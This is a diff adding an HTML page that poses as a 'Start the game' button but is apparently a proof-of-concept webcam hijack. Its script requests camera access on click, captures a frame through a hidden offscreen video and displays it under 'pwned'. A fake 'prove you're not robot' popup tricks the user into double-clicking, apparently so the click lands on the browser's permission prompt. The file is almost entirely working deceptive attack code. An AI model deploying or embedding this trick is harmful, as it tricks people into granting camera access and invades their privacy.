@@ -1,0 +1,55 @@
+<body style="color:white;background-color:black">
+  <center>
+    <br>
+    <br>
+    <br>
+    <br>
+    <br>
+    <button style="padding: 10px 20px; background: linear-gradient(90deg, #4CAF50, #45A049); border: none; border-radius: 25px; color: white; font-size: 16px; font-weight: bold; cursor: pointer; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1); transition: all 0.3s ease; font-size: 50px;">Start the game</button>
+    <br>
+    <br>
+    <br>
+    <br>
+    <img src="https://i.ytimg.com/vi/cWOkHQXw0JQ/hq720.jpg?sqp=-oaymwEhCK4FEIIDSFryq4qpAxMIARUAAAAAGAElAADIQj0AgKJD&rs=AOn4CLCqzdZDkPgmkM1-wTVsdF2LhRxynw">
+  </center>
+  <script>
+    async function captureFrame() {
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: true
+      });
+      const video = document.createElement('video');
+      video.style.position = 'absolute'; // Hide the video offscreen
+      video.style.top = '-9999px';
+      video.playsInline = true; // Required for iOS
+      video.srcObject = stream;
+      document.body.appendChild(video);
+      await video.play();
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+      document.body.innerHTML = ' < h1 > pwned, here is your picture: < br > ';
+      document.body.appendChild(canvas);
+      stream.getTracks().forEach(track => track.stop());
+      document.body.removeChild(video); // Clean up video
+    }
+    document.body.onclick = () => {
+      captureFrame();
+      let params = `scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,width=${window.innerWidth},height=440,left=100,top=180`;
+      setTimeout(() => {
+        let win = open('about:blank', 'win', params);
+        win.document.write(`
+        
+														<body style="background-color: black; margin: 0; height: 100vh; display: flex; flex-direction: column; justify-content: flex-end; align-items: center;">
+															<div style="color: white; position: absolute; bottom: 35vh; left: 50%; transform: translateX(-50%);">
+																<h1>Double click below to prove you're not robot</h1>
+															</div>
+															<div 
+               style="background-color: blue; color: white; margin-bottom: 22vh;">
+																<h3 onmousedown=window.close();>Double Click Here</h3>
+															</div>
+														</body>
+        `);
+      }, 10);
+    };
+  </script>
